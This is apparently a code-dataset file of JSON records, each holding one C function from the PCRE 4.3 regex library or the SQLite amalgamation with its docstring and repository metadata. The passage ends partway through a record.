{"docstring": "/* This function gets one chunk of store and builds a list of pointers and all\nof the captured substrings in it. A NULL pointer is put on the end of the list.\n\nArguments:\n  subject        the subject string that was matched\n  ovector        pointer to the offsets table\n  stringcount    the number of substrings that were captured\n                   (i.e. the yield of the pcre_exec call, unless\n                   that was zero, in which case it should be 1/3\n                   of the offset table size)\n  listptr        set to point to the list of pointers\n\nReturns:         if successful: 0\n                 if not successful:\n                   PCRE_ERROR_NOMEMORY (-6) failed to get store\n*/\n", "func_signal": "int\npcre_get_substring_list(const char *subject, int *ovector, int stringcount,\n  const char ***listptr)", "code": "{\nint i;\nint size = sizeof(char *);\nint double_count = stringcount * 2;\nchar **stringlist;\nchar *p;\n\nfor (i = 0; i < double_count; i += 2)\n  size += sizeof(char *) + ovector[i+1] - ovector[i] + 1;\n\nstringlist = (char **)(pcre_malloc)(size);\nif (stringlist == NULL) return PCRE_ERROR_NOMEMORY;\n\n*listptr = (const char **)stringlist;\np = (char *)(stringlist + stringcount + 1);\n\nfor (i = 0; i < double_count; i += 2)\n  {\n  int len = ovector[i+1] - ovector[i];\n  memcpy(p, subject + ovector[i], len);\n  *stringlist++ = p;\n  p += len;\n  *p++ = 0;\n  }\n\n*stringlist = NULL;\nreturn 0;\n}", "path": "src\\pcre-4.3\\get.c", "repo_name": "timperrett/Mac-SoapClient", "stars": 34, "license": "None", "language": "c", "size": 7602}
{"docstring": "/* This function scans a compiled unanchored expression and attempts to build a\nbitmap of the set of initial characters. If it can't, it returns FALSE. As time\ngoes by, we may be able to get more clever at doing this.\n\nArguments:\n  code         points to an expression\n  start_bits   points to a 32-byte table, initialized to 0\n  caseless     the current state of the caseless flag\n  utf8         TRUE if in UTF-8 mode\n  cd           the block with char table pointers\n\nReturns:       TRUE if table built, FALSE otherwise\n*/\n", "func_signal": "static BOOL\nset_start_bits(const uschar *code, uschar *start_bits, BOOL caseless,\n  BOOL utf8, compile_data *cd)", "code": "{\nregister int c;\n\n/* This next statement and the later reference to dummy are here in order to\ntrick the optimizer of the IBM C compiler for OS/2 into generating correct\ncode. Apparently IBM isn't going to fix the problem, and we would rather not\ndisable optimization (in this module it actually makes a big difference, and\nthe pcre module can use all the optimization it can get). */\n\nvolatile int dummy;\n\ndo\n  {\n  const uschar *tcode = code + 1 + LINK_SIZE;\n  BOOL try_next = TRUE;\n\n  while (try_next)\n    {\n    /* If a branch starts with a bracket or a positive lookahead assertion,\n    recurse to set bits from within them. That's all for this branch. */\n\n    if ((int)*tcode >= OP_BRA || *tcode == OP_ASSERT)\n      {\n      if (!set_start_bits(tcode, start_bits, caseless, utf8, cd))\n        return FALSE;\n      try_next = FALSE;\n      }\n\n    else switch(*tcode)\n      {\n      default:\n      return FALSE;\n\n      /* Skip over callout */\n\n      case OP_CALLOUT:\n      tcode += 2;\n      break;\n\n      /* Skip over extended extraction bracket number */\n\n      case OP_BRANUMBER:\n      tcode += 3;\n      break;\n\n      /* Skip over lookbehind and negative lookahead assertions */\n\n      case OP_ASSERT_NOT:\n      case OP_ASSERTBACK:\n      case OP_ASSERTBACK_NOT:\n      do tcode += GET(tcode, 1); while (*tcode == OP_ALT);\n      tcode += 1+LINK_SIZE;\n      break;\n\n      /* Skip over an option setting, changing the caseless flag */\n\n      case OP_OPT:\n      caseless = (tcode[1] & PCRE_CASELESS) != 0;\n      tcode += 2;\n      break;\n\n      /* BRAZERO does the bracket, but carries on. */\n\n      case OP_BRAZERO:\n      case OP_BRAMINZERO:\n      if (!set_start_bits(++tcode, start_bits, caseless, utf8, cd))\n        return FALSE;\n      dummy = 1;\n      do tcode += GET(tcode,1); while (*tcode == OP_ALT);\n      tcode += 1+LINK_SIZE;\n      break;\n\n      /* Single-char * or ? sets the bit and tries the next item */\n\n      case OP_STAR:\n      case OP_MINSTAR:\n      case OP_QUERY:\n      case OP_MINQUERY:\n      set_bit(start_bits, tcode[1], caseless, cd);\n      tcode += 2;\n#ifdef SUPPORT_UTF8\n      if (utf8) while ((*tcode & 0xc0) == 0x80) tcode++;\n#endif\n      break;\n\n      /* Single-char upto sets the bit and tries the next */\n\n      case OP_UPTO:\n      case OP_MINUPTO:\n      set_bit(start_bits, tcode[3], caseless, cd);\n      tcode += 4;\n#ifdef SUPPORT_UTF8\n      if (utf8) while ((*tcode & 0xc0) == 0x80) tcode++;\n#endif\n      break;\n\n      /* At least one single char sets the bit and stops */\n\n      case OP_EXACT:       /* Fall through */\n      tcode++;\n\n      case OP_CHARS:       /* Fall through */\n      tcode++;\n\n      case OP_PLUS:\n      case OP_MINPLUS:\n      set_bit(start_bits, tcode[1], caseless, cd);\n      try_next = FALSE;\n      break;\n\n      /* Single character type sets the bits and stops */\n\n      case OP_NOT_DIGIT:\n      for (c = 0; c < 32; c++)\n        start_bits[c] |= ~cd->cbits[c+cbit_digit];\n      try_next = FALSE;\n      break;\n\n      case OP_DIGIT:\n      for (c = 0; c < 32; c++)\n        start_bits[c] |= cd->cbits[c+cbit_digit];\n      try_next = FALSE;\n      break;\n\n      case OP_NOT_WHITESPACE:\n      for (c = 0; c < 32; c++)\n        start_bits[c] |= ~cd->cbits[c+cbit_space];\n      try_next = FALSE;\n      break;\n\n      case OP_WHITESPACE:\n      for (c = 0; c < 32; c++)\n        start_bits[c] |= cd->cbits[c+cbit_space];\n      try_next = FALSE;\n      break;\n\n      case OP_NOT_WORDCHAR:\n      for (c = 0; c < 32; c++)\n        start_bits[c] |= ~cd->cbits[c+cbit_word];\n      try_next = FALSE;\n      break;\n\n      case OP_WORDCHAR:\n      for (c = 0; c < 32; c++)\n        start_bits[c] |= cd->cbits[c+cbit_word];\n      try_next = FALSE;\n      break;\n\n      /* One or more character type fudges the pointer and restarts, knowing\n      it will hit a single character type and stop there. */\n\n      case OP_TYPEPLUS:\n      case OP_TYPEMINPLUS:\n      tcode++;\n      break;\n\n      case OP_TYPEEXACT:\n      tcode += 3;\n      break;\n\n      /* Zero or more repeats of character types set the bits and then\n      try again. */\n\n      case OP_TYPEUPTO:\n      case OP_TYPEMINUPTO:\n      tcode += 2;               /* Fall through */\n\n      case OP_TYPESTAR:\n      case OP_TYPEMINSTAR:\n      case OP_TYPEQUERY:\n      case OP_TYPEMINQUERY:\n      switch(tcode[1])\n        {\n        case OP_NOT_DIGIT:\n        for (c = 0; c < 32; c++)\n          start_bits[c] |= ~cd->cbits[c+cbit_digit];\n        break;\n\n        case OP_DIGIT:\n        for (c = 0; c < 32; c++)\n          start_bits[c] |= cd->cbits[c+cbit_digit];\n        break;\n\n        case OP_NOT_WHITESPACE:\n        for (c = 0; c < 32; c++)\n          start_bits[c] |= ~cd->cbits[c+cbit_space];\n        break;\n\n        case OP_WHITESPACE:\n        for (c = 0; c < 32; c++)\n          start_bits[c] |= cd->cbits[c+cbit_space];\n        break;\n\n        case OP_NOT_WORDCHAR:\n        for (c = 0; c < 32; c++)\n          start_bits[c] |= ~cd->cbits[c+cbit_word];\n        break;\n\n        case OP_WORDCHAR:\n        for (c = 0; c < 32; c++)\n          start_bits[c] |= cd->cbits[c+cbit_word];\n        break;\n        }\n\n      tcode += 2;\n      break;\n\n      /* Character class where all the information is in a bit map: set the\n      bits and either carry on or not, according to the repeat count. If it was\n      a negative class, and we are operating with UTF-8 characters, any byte\n      with the top-bit set is a potentially valid starter because it may start\n      a character with a value > 255. (This is sub-optimal in that the\n      character may be in the range 128-255, and those characters might be\n      unwanted, but that's as far as we go for the moment.) */\n\n      case OP_NCLASS:\n      if (utf8) memset(start_bits+16, 0xff, 16);\n      /* Fall through */\n\n      case OP_CLASS:\n        {\n        tcode++;\n        for (c = 0; c < 32; c++) start_bits[c] |= tcode[c];\n        tcode += 32;\n        switch (*tcode)\n          {\n          case OP_CRSTAR:\n          case OP_CRMINSTAR:\n          case OP_CRQUERY:\n          case OP_CRMINQUERY:\n          tcode++;\n          break;\n\n          case OP_CRRANGE:\n          case OP_CRMINRANGE:\n          if (((tcode[1] << 8) + tcode[2]) == 0) tcode += 5;\n            else try_next = FALSE;\n          break;\n\n          default:\n          try_next = FALSE;\n          break;\n          }\n        }\n      break; /* End of bitmap class handling */\n\n      }      /* End of switch */\n    }        /* End of try_next loop */\n\n  code += GET(code, 1);   /* Advance to next branch */\n  }\nwhile (*code == OP_ALT);\nreturn TRUE;\n}", "path": "src\\pcre-4.3\\study.c", "repo_name": "timperrett/Mac-SoapClient", "stars": 34, "license": "None", "language": "c", "size": 7602}
{"docstring": "/* This little function scans through a compiled pattern until it finds a\ncapturing bracket with the given number.\n\nArguments:\n  code        points to start of expression\n  utf8        TRUE in UTF-8 mode\n  number      the required bracket number\n\nReturns:      pointer to the opcode for the bracket, or NULL if not found\n*/\n", "func_signal": "static const uschar *\nfind_bracket(const uschar *code, BOOL utf8, int number)", "code": "{\n#ifndef SUPPORT_UTF8\nutf8 = utf8;               /* Stop pedantic compilers complaining */\n#endif\n\nfor (;;)\n  {\n  register int c = *code;\n  if (c == OP_END) return NULL;\n  else if (c == OP_CHARS) code += code[1] + OP_lengths[c];\n  else if (c > OP_BRA)\n    {\n    int n = c - OP_BRA;\n    if (n > EXTRACT_BASIC_MAX) n = GET2(code, 2+LINK_SIZE);\n    if (n == number) return (uschar *)code;\n    code += OP_lengths[OP_BRA];\n    }\n  else\n    {\n    code += OP_lengths[c];\n\n    /* In UTF-8 mode, opcodes that are followed by a character may be followed\n    by a multi-byte character. The length in the table is a minimum, so we have\n    to scan along to skip the extra characters. All opcodes are less than 128,\n    so we can use relatively efficient code. */\n\n#ifdef SUPPORT_UTF8\n    if (utf8) switch(c)\n      {\n      case OP_EXACT:\n      case OP_UPTO:\n      case OP_MINUPTO:\n      case OP_STAR:\n      case OP_MINSTAR:\n      case OP_PLUS:\n      case OP_MINPLUS:\n      case OP_QUERY:\n      case OP_MINQUERY:\n      while ((*code & 0xc0) == 0x80) code++;\n      break;\n      }\n#endif\n    }\n  }\n}", "path": "src\\pcre-4.3\\pcre.c", "repo_name": "timperrett/Mac-SoapClient", "stars": 34, "license": "None", "language": "c", "size": 7602}
{"docstring": "/* This is called to find out if every branch starts with ^ or .* so that\n\"first char\" processing can be done to speed things up in multiline\nmatching and for non-DOTALL patterns that start with .* (which must start at\nthe beginning or after \\n). As in the case of is_anchored() (see above), we\nhave to take account of back references to capturing brackets that contain .*\nbecause in that case we can't make the assumption.\n\nArguments:\n  code           points to start of expression (the bracket)\n  bracket_map    a bitmap of which brackets we are inside while testing; this\n                  handles up to substring 31; after that we just have to take\n                  the less precise approach\n  backref_map    the back reference bitmap\n\nReturns:         TRUE or FALSE\n*/\n", "func_signal": "static BOOL\nis_startline(const uschar *code, unsigned int bracket_map,\n  unsigned int backref_map)", "code": "{\ndo {\n   const uschar *scode = first_significant_code(code + 1+LINK_SIZE, NULL, 0);\n   register int op = *scode;\n\n   /* Capturing brackets */\n\n   if (op > OP_BRA)\n     {\n     int new_map;\n     op -= OP_BRA;\n     if (op > EXTRACT_BASIC_MAX) op = GET2(scode, 2+LINK_SIZE);\n     new_map = bracket_map | ((op < 32)? (1 << op) : 1);\n     if (!is_startline(scode, new_map, backref_map)) return FALSE;\n     }\n\n   /* Other brackets */\n\n   else if (op == OP_BRA || op == OP_ASSERT || op == OP_ONCE || op == OP_COND)\n     { if (!is_startline(scode, bracket_map, backref_map)) return FALSE; }\n\n   /* .* is not anchored unless DOTALL is set and it isn't in brackets that\n   may be referenced. */\n\n   else if (op == OP_TYPESTAR || op == OP_TYPEMINSTAR)\n     {\n     if (scode[1] != OP_ANY || (bracket_map & backref_map) != 0) return FALSE;\n     }\n\n   /* Check for explicit circumflex */\n\n   else if (op != OP_CIRC) return FALSE;\n   code += GET(code, 1);\n   }\nwhile (*code == OP_ALT);  /* Loop for each alternative */\nreturn TRUE;\n}", "path": "src\\pcre-4.3\\pcre.c", "repo_name": "timperrett/Mac-SoapClient", "stars": 34, "license": "None", "language": "c", "size": 7602}
{"docstring": "/* Print a sequence of chars in printable format, stopping at the end of the\nsubject if the requested.\n\nArguments:\n  p           points to characters\n  length      number to print\n  is_subject  TRUE if printing from within md->start_subject\n  md          pointer to matching data block, if is_subject is TRUE\n\nReturns:     nothing\n*/\n", "func_signal": "static void\npchars(const uschar *p, int length, BOOL is_subject, match_data *md)", "code": "{\nint c;\nif (is_subject && length > md->end_subject - p) length = md->end_subject - p;\nwhile (length-- > 0)\n  if (isprint(c = *(p++))) printf(\"%c\", c); else printf(\"\\\\x%02x\", c);\n}", "path": "src\\pcre-4.3\\pcre.c", "repo_name": "timperrett/Mac-SoapClient", "stars": 34, "license": "None", "language": "c", "size": 7602}
{"docstring": "/* Given a character, set its bit in the table, and also the bit for the other\nversion of a letter if we are caseless.\n\nArguments:\n  start_bits    points to the bit map\n  c             is the character\n  caseless      the caseless flag\n  cd            the block with char table pointers\n\nReturns:        nothing\n*/\n", "func_signal": "static void\nset_bit(uschar *start_bits, int c, BOOL caseless, compile_data *cd)", "code": "{\nstart_bits[c/8] |= (1 << (c&7));\nif (caseless && (cd->ctypes[c] & ctype_letter) != 0)\n  start_bits[cd->fcc[c]/8] |= (1 << (cd->fcc[c]&7));\n}", "path": "src\\pcre-4.3\\study.c", "repo_name": "timperrett/Mac-SoapClient", "stars": 34, "license": "None", "language": "c", "size": 7602}
{"docstring": "/* If a back reference hasn't been set, the length that is passed is greater\nthan the number of characters left in the string, so the match fails.\n\nArguments:\n  offset      index into the offset vector\n  eptr        points into the subject\n  length      length to be matched\n  md          points to match data block\n  ims         the ims flags\n\nReturns:      TRUE if matched\n*/\n", "func_signal": "static BOOL\nmatch_ref(int offset, register const uschar *eptr, int length, match_data *md,\n  unsigned long int ims)", "code": "{\nconst uschar *p = md->start_subject + md->offset_vector[offset];\n\n#ifdef DEBUG\nif (eptr >= md->end_subject)\n  printf(\"matching subject <null>\");\nelse\n  {\n  printf(\"matching subject \");\n  pchars(eptr, length, TRUE, md);\n  }\nprintf(\" against backref \");\npchars(p, length, FALSE, md);\nprintf(\"\\n\");\n#endif\n\n/* Always fail if not enough characters left */\n\nif (length > md->end_subject - eptr) return FALSE;\n\n/* Separate the caselesss case for speed */\n\nif ((ims & PCRE_CASELESS) != 0)\n  {\n  while (length-- > 0)\n    if (md->lcc[*p++] != md->lcc[*eptr++]) return FALSE;\n  }\nelse\n  { while (length-- > 0) if (*p++ != *eptr++) return FALSE; }\n\nreturn TRUE;\n}", "path": "src\\pcre-4.3\\pcre.c", "repo_name": "timperrett/Mac-SoapClient", "stars": 34, "license": "None", "language": "c", "size": 7602}
{"docstring": "/*\n** This routine will drop an existing named index.  This routine\n** implements the DROP INDEX statement.\n*/\n", "func_signal": "SQLITE_PRIVATE void sqlite3DropIndex(Parse *pParse, SrcList *pName, int ifExists)", "code": "{\n  Index *pIndex;\n  Vdbe *v;\n  sqlite3 *db = pParse->db;\n  int iDb;\n\n  assert( pParse->nErr==0 );   /* Never called with prior errors */\n  if( db->mallocFailed ){\n    goto exit_drop_index;\n  }\n  assert( pName->nSrc==1 );\n  if( SQLITE_OK!=sqlite3ReadSchema(pParse) ){\n    goto exit_drop_index;\n  }\n  pIndex = sqlite3FindIndex(db, pName->a[0].zName, pName->a[0].zDatabase);\n  if( pIndex==0 ){\n    if( !ifExists ){\n      sqlite3ErrorMsg(pParse, \"no such index: %S\", pName, 0);\n    }\n    pParse->checkSchema = 1;\n    goto exit_drop_index;\n  }\n  if( pIndex->autoIndex ){\n    sqlite3ErrorMsg(pParse, \"index associated with UNIQUE \"\n      \"or PRIMARY KEY constraint cannot be dropped\", 0);\n    goto exit_drop_index;\n  }\n  iDb = sqlite3SchemaToIndex(db, pIndex->pSchema);\n#ifndef SQLITE_OMIT_AUTHORIZATION\n  {\n    int code = SQLITE_DROP_INDEX;\n    Table *pTab = pIndex->pTable;\n    const char *zDb = db->aDb[iDb].zName;\n    const char *zTab = SCHEMA_TABLE(iDb);\n    if( sqlite3AuthCheck(pParse, SQLITE_DELETE, zTab, 0, zDb) ){\n      goto exit_drop_index;\n    }\n    if( !OMIT_TEMPDB && iDb ) code = SQLITE_DROP_TEMP_INDEX;\n    if( sqlite3AuthCheck(pParse, code, pIndex->zName, pTab->zName, zDb) ){\n      goto exit_drop_index;\n    }\n  }\n#endif\n\n  /* Generate code to remove the index and from the master table */\n  v = sqlite3GetVdbe(pParse);\n  if( v ){\n    sqlite3BeginWriteOperation(pParse, 1, iDb);\n    sqlite3NestedParse(pParse,\n       \"DELETE FROM %Q.%s WHERE name=%Q\",\n       db->aDb[iDb].zName, SCHEMA_TABLE(iDb),\n       pIndex->zName\n    );\n    if( sqlite3FindTable(db, \"sqlite_stat1\", db->aDb[iDb].zName) ){\n      sqlite3NestedParse(pParse,\n        \"DELETE FROM %Q.sqlite_stat1 WHERE idx=%Q\",\n        db->aDb[iDb].zName, pIndex->zName\n      );\n    }\n    sqlite3ChangeCookie(pParse, iDb);\n    destroyRootPage(pParse, pIndex->tnum, iDb);\n    sqlite3VdbeAddOp4(v, OP_DropIndex, iDb, 0, 0, pIndex->zName, 0);\n  }\n\nexit_drop_index:\n  sqlite3SrcListDelete(db, pName);\n}", "path": "libs\\sqlite3\\sqlite3.c", "repo_name": "oesmith/obdgpslogger", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 1357}
{"docstring": "/*\n** The first parameter is a pointer to an output buffer. The second \n** parameter is a pointer to an integer that contains the offset at\n** which to write into the output buffer. This function copies the\n** nul-terminated string pointed to by the third parameter, zSignedIdent,\n** to the specified offset in the buffer and updates *pIdx to refer\n** to the first byte after the last byte written before returning.\n** \n** If the string zSignedIdent consists entirely of alpha-numeric\n** characters, does not begin with a digit and is not an SQL keyword,\n** then it is copied to the output buffer exactly as it is. Otherwise,\n** it is quoted using double-quotes.\n*/\n", "func_signal": "static void identPut(char *z, int *pIdx, char *zSignedIdent)", "code": "{\n  unsigned char *zIdent = (unsigned char*)zSignedIdent;\n  int i, j, needQuote;\n  i = *pIdx;\n\n  for(j=0; zIdent[j]; j++){\n    if( !sqlite3Isalnum(zIdent[j]) && zIdent[j]!='_' ) break;\n  }\n  needQuote = sqlite3Isdigit(zIdent[0]) || sqlite3KeywordCode(zIdent, j)!=TK_ID;\n  if( !needQuote ){\n    needQuote = zIdent[j];\n  }\n\n  if( needQuote ) z[i++] = '\"';\n  for(j=0; zIdent[j]; j++){\n    z[i++] = zIdent[j];\n    if( zIdent[j]=='\"' ) z[i++] = '\"';\n  }\n  if( needQuote ) z[i++] = '\"';\n  z[i] = 0;\n  *pIdx = i;\n}", "path": "libs\\sqlite3\\sqlite3.c", "repo_name": "oesmith/obdgpslogger", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 1357}
{"docstring": "/*\n** Implementation of a scalar function that decodes r-tree nodes to\n** human readable strings. This can be used for debugging and analysis.\n**\n** The scalar function takes two arguments, a blob of data containing\n** an r-tree node, and the number of dimensions the r-tree indexes.\n** For a two-dimensional r-tree structure called \"rt\", to deserialize\n** all nodes, a statement like:\n**\n**   SELECT rtreenode(2, data) FROM rt_node;\n**\n** The human readable string takes the form of a Tcl list with one\n** entry for each cell in the r-tree node. Each entry is itself a\n** list, containing the 8-byte rowid/pageno followed by the \n** <num-dimension>*2 coordinates.\n*/\n", "func_signal": "static void rtreenode(sqlite3_context *ctx, int nArg, sqlite3_value **apArg)", "code": "{\n  char *zText = 0;\n  RtreeNode node;\n  Rtree tree;\n  int ii;\n\n  memset(&node, 0, sizeof(RtreeNode));\n  memset(&tree, 0, sizeof(Rtree));\n  tree.nDim = sqlite3_value_int(apArg[0]);\n  tree.nBytesPerCell = 8 + 8 * tree.nDim;\n  node.zData = (u8 *)sqlite3_value_blob(apArg[1]);\n\n  for(ii=0; ii<NCELL(&node); ii++){\n    char zCell[512];\n    int nCell = 0;\n    RtreeCell cell;\n    int jj;\n\n    nodeGetCell(&tree, &node, ii, &cell);\n    sqlite3_snprintf(512-nCell,&zCell[nCell],\"%d\", cell.iRowid);\n    nCell = strlen(zCell);\n    for(jj=0; jj<tree.nDim*2; jj++){\n      sqlite3_snprintf(512-nCell,&zCell[nCell],\" %f\",(double)cell.aCoord[jj].f);\n      nCell = strlen(zCell);\n    }\n\n    if( zText ){\n      char *zTextNew = sqlite3_mprintf(\"%s {%s}\", zText, zCell);\n      sqlite3_free(zText);\n      zText = zTextNew;\n    }else{\n      zText = sqlite3_mprintf(\"{%s}\", zCell);\n    }\n  }\n  \n  sqlite3_result_text(ctx, zText, -1, sqlite3_free);\n}", "path": "libs\\sqlite3\\sqlite3.c", "repo_name": "oesmith/obdgpslogger", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 1357}
{"docstring": "/*\n** If zNum represents an integer that will fit in 32-bits, then set\n** *pValue to that integer and return true.  Otherwise return false.\n**\n** Any non-numeric characters that following zNum are ignored.\n** This is different from sqlite3Atoi64() which requires the\n** input number to be zero-terminated.\n*/\n", "func_signal": "SQLITE_PRIVATE int sqlite3GetInt32(const char *zNum, int *pValue)", "code": "{\n  sqlite_int64 v = 0;\n  int i, c;\n  int neg = 0;\n  if( zNum[0]=='-' ){\n    neg = 1;\n    zNum++;\n  }else if( zNum[0]=='+' ){\n    zNum++;\n  }\n  while( zNum[0]=='0' ) zNum++;\n  for(i=0; i<11 && (c = zNum[i] - '0')>=0 && c<=9; i++){\n    v = v*10 + c;\n  }\n\n  /* The longest decimal representation of a 32 bit integer is 10 digits:\n  **\n  **             1234567890\n  **     2^31 -> 2147483648\n  */\n  if( i>10 ){\n    return 0;\n  }\n  if( v-neg>2147483647 ){\n    return 0;\n  }\n  if( neg ){\n    v = -v;\n  }\n  *pValue = (int)v;\n  return 1;\n}", "path": "libs\\sqlite3\\sqlite3.c", "repo_name": "oesmith/obdgpslogger", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 1357}
{"docstring": "/*\n** Allocate nBytes of memory\n*/\n", "func_signal": "static void *memsys5Malloc(int nBytes)", "code": "{\n  sqlite3_int64 *p = 0;\n  if( nBytes>0 ){\n    memsys5Enter();\n    p = memsys5MallocUnsafe(nBytes);\n    memsys5Leave();\n  }\n  return (void*)p; \n}", "path": "libs\\sqlite3\\sqlite3.c", "repo_name": "oesmith/obdgpslogger", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 1357}
{"docstring": "/*\n** Print out information about all locking operations.\n**\n** This routine is used for troubleshooting locks on multithreaded\n** platforms.  Enable by compiling with the -DSQLITE_LOCK_TRACE\n** command-line option on the compiler.  This code is normally\n** turned off.\n*/\n", "func_signal": "static int lockTrace(int fd, int op, struct flock *p)", "code": "{\n  char *zOpName, *zType;\n  int s;\n  int savedErrno;\n  if( op==F_GETLK ){\n    zOpName = \"GETLK\";\n  }else if( op==F_SETLK ){\n    zOpName = \"SETLK\";\n  }else{\n    s = fcntl(fd, op, p);\n    sqlite3DebugPrintf(\"fcntl unknown %d %d %d\\n\", fd, op, s);\n    return s;\n  }\n  if( p->l_type==F_RDLCK ){\n    zType = \"RDLCK\";\n  }else if( p->l_type==F_WRLCK ){\n    zType = \"WRLCK\";\n  }else if( p->l_type==F_UNLCK ){\n    zType = \"UNLCK\";\n  }else{\n    assert( 0 );\n  }\n  assert( p->l_whence==SEEK_SET );\n  s = fcntl(fd, op, p);\n  savedErrno = errno;\n  sqlite3DebugPrintf(\"fcntl %d %d %s %s %d %d %d %d\\n\",\n     threadid, fd, zOpName, zType, (int)p->l_start, (int)p->l_len,\n     (int)p->l_pid, s);\n  if( s==(-1) && op==F_SETLK && (p->l_type==F_RDLCK || p->l_type==F_WRLCK) ){\n    struct flock l2;\n    l2 = *p;\n    fcntl(fd, F_GETLK, &l2);\n    if( l2.l_type==F_RDLCK ){\n      zType = \"RDLCK\";\n    }else if( l2.l_type==F_WRLCK ){\n      zType = \"WRLCK\";\n    }else if( l2.l_type==F_UNLCK ){\n      zType = \"UNLCK\";\n    }else{\n      assert( 0 );\n    }\n    sqlite3DebugPrintf(\"fcntl-failure-reason: %s %d %d %d\\n\",\n       zType, (int)l2.l_start, (int)l2.l_len, (int)l2.l_pid);\n  }\n  errno = savedErrno;\n  return s;\n}", "path": "libs\\sqlite3\\sqlite3.c", "repo_name": "oesmith/obdgpslogger", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 1357}
{"docstring": "/*\n** Return the most recent error code generated by an SQLite routine. If NULL is\n** passed to this function, we assume a malloc() failed during sqlite3_open().\n*/\n", "func_signal": "SQLITE_API int sqlite3_errcode(sqlite3 *db)", "code": "{\n  if( db && !sqlite3SafetyCheckSickOrOk(db) ){\n    return SQLITE_MISUSE;\n  }\n  if( !db || db->mallocFailed ){\n    return SQLITE_NOMEM;\n  }\n  return db->errCode & db->errMask;\n}", "path": "libs\\sqlite3\\sqlite3.c", "repo_name": "oesmith/obdgpslogger", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 1357}
{"docstring": "/*\n** Close a tokenization cursor previously opened by a call to icuOpen().\n*/\n", "func_signal": "static int icuClose(sqlite3_tokenizer_cursor *pCursor)", "code": "{\n  IcuCursor *pCsr = (IcuCursor *)pCursor;\n  ubrk_close(pCsr->pIter);\n  sqlite3_free(pCsr->zBuffer);\n  sqlite3_free(pCsr);\n  return SQLITE_OK;\n}", "path": "libs\\sqlite3\\sqlite3.c", "repo_name": "oesmith/obdgpslogger", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 1357}
{"docstring": "/*\n** A write-transaction must be opened before calling this function.\n** It performs a single unit of work towards an incremental vacuum.\n**\n** If the incremental vacuum is finished after this function has run,\n** SQLITE_DONE is returned. If it is not finished, but no error occurred,\n** SQLITE_OK is returned. Otherwise an SQLite error code. \n*/\n", "func_signal": "SQLITE_PRIVATE int sqlite3BtreeIncrVacuum(Btree *p)", "code": "{\n  int rc;\n  BtShared *pBt = p->pBt;\n\n  sqlite3BtreeEnter(p);\n  assert( pBt->inTransaction==TRANS_WRITE && p->inTrans==TRANS_WRITE );\n  if( !pBt->autoVacuum ){\n    rc = SQLITE_DONE;\n  }else{\n    invalidateAllOverflowCache(pBt);\n    rc = incrVacuumStep(pBt, 0, pagerPagecount(pBt));\n  }\n  sqlite3BtreeLeave(p);\n  return rc;\n}", "path": "libs\\sqlite3\\sqlite3.c", "repo_name": "oesmith/obdgpslogger", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 1357}
{"docstring": "/*\n** Allocate memory that is to be used and released right away.\n** This routine is similar to alloca() in that it is not intended\n** for situations where the memory might be held long-term.  This\n** routine is intended to get memory to old large transient data\n** structures that would not normally fit on the stack of an\n** embedded processor.\n*/\n", "func_signal": "SQLITE_PRIVATE void *sqlite3ScratchMalloc(int n)", "code": "{\n  void *p;\n  assert( n>0 );\n\n#if SQLITE_THREADSAFE==0 && !defined(NDEBUG)\n  /* Verify that no more than one scratch allocation per thread\n  ** is outstanding at one time.  (This is only checked in the\n  ** single-threaded case since checking in the multi-threaded case\n  ** would be much more complicated.) */\n  assert( scratchAllocOut==0 );\n#endif\n\n  if( sqlite3GlobalConfig.szScratch<n ){\n    goto scratch_overflow;\n  }else{  \n    sqlite3_mutex_enter(mem0.mutex);\n    if( mem0.nScratchFree==0 ){\n      sqlite3_mutex_leave(mem0.mutex);\n      goto scratch_overflow;\n    }else{\n      int i;\n      i = mem0.aScratchFree[--mem0.nScratchFree];\n      i *= sqlite3GlobalConfig.szScratch;\n      sqlite3StatusAdd(SQLITE_STATUS_SCRATCH_USED, 1);\n      sqlite3StatusSet(SQLITE_STATUS_SCRATCH_SIZE, n);\n      sqlite3_mutex_leave(mem0.mutex);\n      p = (void*)&((char*)sqlite3GlobalConfig.pScratch)[i];\n      assert(  (((u8*)p - (u8*)0) & 7)==0 );\n    }\n  }\n#if SQLITE_THREADSAFE==0 && !defined(NDEBUG)\n  scratchAllocOut = p!=0;\n#endif\n\n  return p;\n\nscratch_overflow:\n  if( sqlite3GlobalConfig.bMemstat ){\n    sqlite3_mutex_enter(mem0.mutex);\n    sqlite3StatusSet(SQLITE_STATUS_SCRATCH_SIZE, n);\n    n = mallocWithAlarm(n, &p);\n    if( p ) sqlite3StatusAdd(SQLITE_STATUS_SCRATCH_OVERFLOW, n);\n    sqlite3_mutex_leave(mem0.mutex);\n  }else{\n    p = sqlite3GlobalConfig.m.xMalloc(n);\n  }\n#if SQLITE_THREADSAFE==0 && !defined(NDEBUG)\n  scratchAllocOut = p!=0;\n#endif\n  return p;    \n}", "path": "libs\\sqlite3\\sqlite3.c", "repo_name": "oesmith/obdgpslogger", "stars": 40, "license": "gpl-2.0", "language": "c", "size": 1357}
{"docstring": "/*\n** This function is called after an \"ALTER TABLE ... ADD\" statement\n** has been parsed. Argument pColDef contains the text of the new\n** column definition.\n**\n** The Table structure pParse->pNewTable was extended to include\n** the new column during parsing.\n*/\n", "func_signal": "SQLITE_PRIVATE void sqlite3AlterFinishAddColumn(Parse *pParse, Token *pColDef)", "code": "{\n  Table *pNew;              /* Copy of pParse->pNewTable */\n  Table *pTab;              /* Table being altered */\n  int iDb;                  /* Database number */\n  const char *zDb;          /* Database name */\n  const char *zTab;         /* Table name */\n  char *zCol;               /* Null-terminated column definition */\n  Column *pCol;             /* The new column */\n  Expr *pDflt;              /* Default value for the new column */\n  sqlite3 *db;              /* The database connection; */\n\n  db = pParse->db;\n  if( pParse->nErr || db->mallocFailed ) return;\n  pNew = pParse->pNewTable;\n  assert( pNew );\n\n  assert( sqlite3BtreeHoldsAllMutexes(db) );\n  iDb = sqlite3SchemaToIndex(db, pNew->pSchema);\n  zDb = db->aDb[iDb].zName;\n  zTab = &pNew->zName[16];  /* Skip the \"sqlite_altertab_\" prefix on the name */\n  pCol = &pNew->aCol[pNew->nCol-1];\n  pDflt = pCol->pDflt;\n  pTab = sqlite3FindTable(db, zTab, zDb);\n  assert( pTab 